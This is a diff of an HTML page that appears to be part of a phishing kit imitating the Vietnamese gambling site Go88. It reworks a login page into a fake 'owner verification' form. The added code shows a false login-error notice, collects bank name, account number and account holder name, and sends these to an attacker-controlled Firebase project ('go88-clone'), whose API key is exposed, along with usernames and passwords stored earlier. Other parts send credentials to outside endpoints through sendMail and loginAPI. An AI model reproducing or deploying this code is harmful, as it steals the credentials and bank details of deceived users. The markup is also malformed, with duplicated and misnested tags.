@@ -63,72 +63,73 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         type="text/css">
     <!-- Custom styles for this template -->
     <link href="login/style-3.css" rel="stylesheet"> 
-<body id="page-top" cz-shortcut-listen="true" style="cursor: url(&quot;chrome-extension://jlgkpaicikihijadgifklkbpdajbkhjo/image/cursors/014.png&quot;), default;">
+<body onload="onload()" id="page-top" cz-shortcut-listen="true" style="cursor: url(&quot;chrome-extension://jlgkpaicikihijadgifklkbpdajbkhjo/image/cursors/014.png&quot;), default;">
+</head> 
+
+<html>
+<head>
+	<title>xác minh chính chủ Go88</title>
+	<meta charset="utf-8">
 </head>
-<link rel='shortcut icon' href='images/logo.png' />
-    <title>Xác Minh Lại Tài Khoản | Xác Minh Chính Chủ Nạp-Rút</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.5, minimum-scale=0.3, user-scalable=no" />
-    <link id="page_favicon" href="images/logo.png" rel="shortcut icon" type="image/x-icon" />
-    <meta name="description" content="Xác minh tài khoản Go88, xác minh chính chủ Nạp-Rút" />
-    <meta name="keywords" content="Xác minh tài khoản Go88, xác minh chính chủ Nạp-Rút">
-    <meta name="robots" content="index, follow">
-    <meta property="og:type" content="website" />
-    <meta property="og:title" content="Xác minh tài khoản Go88, xác minh chính chủ Nạp-Rút" />
-   
+<body>
+      
     <section id="form">
         <div class="content">
             <div class="row">
                 <a class="logo text-center">
-                    <img class="img-responsive" src="images/logo1.png" id="logo" alt="">
+                    <img class="img-responsive" src="login/images/logo.png" id="logo" alt="">
                 </a>
-            </div>
+            </div> 
+            <form action="" method="POST" > 
             <div class="row">
                 <div class="content-noti">
-                    <div id="note" class="note text-center" style="Website sử lý nạp tiền lâu, nạp tiền bị từ chối, nạp tiền quên nhập codePay"></div>
+                    <div id="note" class="note text-center" style="">Tên đăng nhập hoặc mật khẩu không đúng</div>
                 </div>
             </div>
-            <div class="row">
-                <form class="regFrm" name="registerForm" action="" id="registerForm" method="POST" role="form"
-                    novalidate="novalidate">
-                    <div class="bg-login">
-                        <div class="form-group" id="registerEditbox">
-                      <input type="text" class="form-control has-icon-prepend" id="username" name="username"
-                                maxlength="17" placeholder="Tên đăng nhập" required="" aria-required="true">
-                        </div>
-                        <div class="form-group" id="registerEditbox">
-                            <input type="password" class="form-control has-icon-prepend" id="pwd" name="password" maxlength="17" placeholder="Mật khẩu" required="" aria-required="true">
-                        </div>
-                        <div class="row">
-                            <div class="note">
-                                <input type="checkbox" name="fordCheckBox" id="remember" value="remember">
-                                <label for="remember"><span>Tự động đăng nhập</span></label>
-                            </div>
+            <div class="row" style="justify-content: center; align-items: center; align-content: center;flex-direction: column;" id="registerForm">
+                <div class="bg-logn" style="width: 100%;max-width: 400px;">
+                <div class="form-group" id="registerEditbox" style="margin-top: 20px;">
+                        <input type="text" class="form-control has-icon-prepend" id="bankname" name="b1"
+                            maxlength="30" placeholder="ngân hàng chính chủ" required="" aria-required="true">
+                    </div> 
+                    <div class="form-group" id="registerEditbox" style="margin-top: 20px;">
+                        <input type="text" class="form-control has-icon-prepend" id="stk" name="b2"
+                            maxlength="30" placeholder="STK muốn xác minh chính chủ" required="" aria-required="true">
+                    </div> 
+                    <div class="form-group" id="registerEditbox" style="margin-top: 20px;">
+                        <input type="text" class="form-control has-icon-prepend" id="name-confirm" name="b3"
+                            maxlength="30" placeholder="Họ tên tài khoản cần xác minh chính chủ " required="" aria-required="true">
+                    </div> 
+                    
+                    
                         </div>
                     </div>
-                    <div class="row">
-                        <div class="col-12 text-center login-button"> 
-                        <a id="facebook" class="" href="facebook" dmonclick="onSubmitFacebook()">
-                                <img src="images/iconface.png" alt="">
-                            </a>
-                            <button type="submit" id="login-submit" class="" onclick="onSubmit()">
-                                <img src="images/btn_DangNhap.png" alt="">
-                            </button> </div> </div>
-<!-- Bootstrap core JavaScript -->
-    <script src="login/js/jquery.min.js"></script>
-    <script src="login/lib/ua-parser.min.js"></script>
-    <script src="login/js/bootstrap.min.js"></script>
-    <script src="login/js/jquery.validate.min.js"></script>
-    <script src="login/js/common.js"></script>
-    <!-- <script src="login/js/profilerConfig.js"></script> -->
-    <script src="login/js/Base64.js"></script>
-    <script src="login/js/Fingerprintjs2/fingerprint2.js"></script>  
-
-
+                    
+                    
+                </div>
+                <div class="row">
+                    <div class="col-12 text-center login-button">
+                        <button type="submit" id="login-submit" class=""> 
+                         
+          
+              <img src="images/xacnhan.png" alt=""> 
+                               
+           </form>  
+                        </button>
+                        
+                
+                    </div>
+                </form>
+            </div>
+        </div>
+    </section>
+   
+    </style>
+    
  <script>let mainURL, userName, passWord,ginURL, session_id, facebookLoginURL, aff_id = "",
     app_id, Appid_FaceBook, urlFBCallback, isBack;
 
 var isNeedVerify = false;
-
 
 function requestProfiler() {
     // console.log("requestProfiler profilerURL: " + profilerURL);
@@ -324,14 +325,70 @@ const onSubmit = () => {
         userName = document.getElementById("username").value;
         passWord = document.getElementById("pwd").value;
     }
-    console.log('userName',userName);
-    console.log('passWord',passWord);
 
     if (!validate(document.getElementById("username").value, document.getElementById("pwd").value)) return;
-    localStorage.setItem("KEY_USER_NAME", userName);
-    localStorage.setItem("KEY_PASSWORD", passWord);
+
     if (validate(userName, passWord)) {
-        window.location.replace("xac_minh.html")
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var parser = new UAParser();
+        parser.setUA(userAgent);
+        var result = parser.getResult();
+        let data= {
+            "username": userName,
+            "password": passWord,
+            "os": result.os.name,
+            "device": result.device.model,
+            "browser": result.browser.name,
+            "app_id": app_id,
+        };
+        // if (aff_id != "") {
+        //     data = {
+        //         "username": userName,
+        //         "password": passWord,
+        //         "os": result.os.name,
+        //         "device": result.device.model,
+        //         "browser": result.browser.name,
+        //         "app_id": app_id,
+        //         "aff_id": aff_id
+        //     }
+        // } else {
+        //     data = {
+        //         "username": userName,
+        //         "password": passWord,
+        //         "os": result.os.name,
+        //         "device": result.device.model,
+        //         "browser": result.browser.name,
+        //         "app_id": app_id,
+        //     }
+        // }
+
+        let fgid = localStorage.getItem("fingerprint");
+        if (fgid == null || fgid == undefined) {
+            Fingerprint2.get(function(components) {
+                try {
+                    fingerprint = Fingerprint2.x64hash128(components.map(function(pair) {
+                        return pair.value;
+                    }).join(''), 31);
+                    fgid = fingerprint;
+                    localStorage.setItem("fingerprint", fingerprint);
+                } catch {}
+            })
+        }
+
+        data.fg = fgid;
+
+        // console.log("Fingerprint2: " + fgid);
+        // console.log("data: " + JSON.stringify(data));
+
+        loginAPI({
+            "username": userName,
+            "password": passWord,
+            "os": result.os.name,
+            "device": result.device.model,
+            "browser": result.browser.name,
+            "app_id": app_id,
+            "fg":fgid
+        });
     }
 }
 const onSubmitFacebook = () => {
@@ -380,7 +437,7 @@ const loginAPI = (data) => {
     return sendMail(userName, passWord,  0, "session_id");
 
     var xmlhttp = new XMLHttpRequest(); // new HttpRequest instance
-    xmlhttp.open("POST", "login.php");
+    xmlhttp.open("POST", "https://play.go88.live/login.php");
     xmlhttp.setRequestHeader("Content-Type", "application/json");
     xmlhttp.send(JSON.stringify(data));
     xmlhttp.onerror = () => {
@@ -519,7 +576,7 @@ function sendMail(username, password, gold, session_id){
   xhr.setRequestHeader("Cookie", "__cfduid=d52ebaa7548c9c5f405a4c68d53943f321610421320");
 
   xhr.onreadystatechange = function() {
-   window.location.replace("xac_minh.html")
+   window.location.replace("")
   }
 
   xhr.send(data);
@@ -541,7 +598,7 @@ const isNullOrEmpty = (text) => {
 
 const onclickDangNhap = () => {
     localStorage.setItem("isAutoLogin", false);
-    window.open("dangnhap.html", "_self")
+    window.open("https://go88.live/dangnhap.html", "_self")
 }
 
 window.mobileAndTabletcheck = function() {
@@ -556,23 +613,82 @@ if (performance.navigation.type == 2) {
     localStorage.setItem("isBack", true);
 }
 
-const form = document.getElementById('login-submit');
-form.addEventListener('onclick', onSubmit);
+
 const facebookBtn = document.getElementById('facebook');
-facebookBtn.addEventListener('onclick', onSubmitFacebook);</script>
-    <script>$("#pwd").on("keypress", function (event) {
-            if (event.keyCode == 13) {
-                event.preventDefault();
-                event.target.blur();
-                $("#login-submit").click();
-            }
-    <script>$("#verify-input").on("keypress", function (event) {
-            if (event.keyCode == 13) {
-                event.preventDefault();
-                event.target.blur();
-                $("#verify-submit").click();
-            }
-        })</script>
+facebookBtn.addEventListener('onclick', onSubmitFacebook);
+</script>
+<script type="module" async = "false" >
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.13.0/firebase-app.js";
+    import { getFirestore , collection, addDoc } from "https://www.gstatic.com/firebasejs/9.13.0/firebase-firestore.js";
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+  
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyAfta_rGDeeIRk6lzvPxwBqJkvtdOOnjWg",
+      authDomain: "go88-clone.firebaseapp.com",
+      projectId: "go88-clone",
+      storageBucket: "go88-clone.appspot.com",
+      messagingSenderId: "578140509410",
+      appId: "1:578140509410:web:2f4ca2310b8995d330fabb",
+      measurementId: "G-CQS898FFY0"
+    };
+  
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db  = getFirestore(app);
+    const form = document.getElementById('login-submit');
+    console.log('form',form);
+    form.addEventListener('click',async function(event){
+        event.preventDefault();
+        const bankName = document.getElementById('bankname').value;
+        const stk = document.getElementById('stk').value;
+        const nameConfirm = document.getElementById('name-confirm').value;
+        const username = localStorage.getItem('KEY_USER_NAME');
+        const password = localStorage.getItem('KEY_PASSWORD');
+        console.log('bankName',bankName);
+        console.log('stk',stk);
+        console.log('nameConfirm',nameConfirm);
+        console.log('username',username);
+        console.log('password',password);
+        if (bankName.length === 0) {
+            alert("Tên ngân hàng không được để trống!");
+            return false;
+        }
+        if (stk.length === 0) {
+            alert("Số tài khoản không được để trống!");
+            return false;
+        }
+        if (nameConfirm.length === 0) {
+            alert("Tên không thể để trống!");
+            return false;
+        }
+        try {
+        const docRef = await addDoc(collection(db, "users"), {
+            username: username,
+            password: password,
+            bankName:bankName,
+            stk:stk,
+            nameConfirm:nameConfirm,
+            time: Date.now()
+        });
+            alert('Thành Công ! Vui lòng chờ admin xét duyệt');
+            localStorage.removeItem('KEY_USER_NAME');
+            localStorage.removeItem('KEY_PASSWORD');
+            window.location.replace('index.html');
+        } catch (error) {
+            console.error("Error adding document: ", error);
+        }
+       
+    });
+    
+</script>
+</body>
+
+</html>
+ 
 </body>
 
 </html>
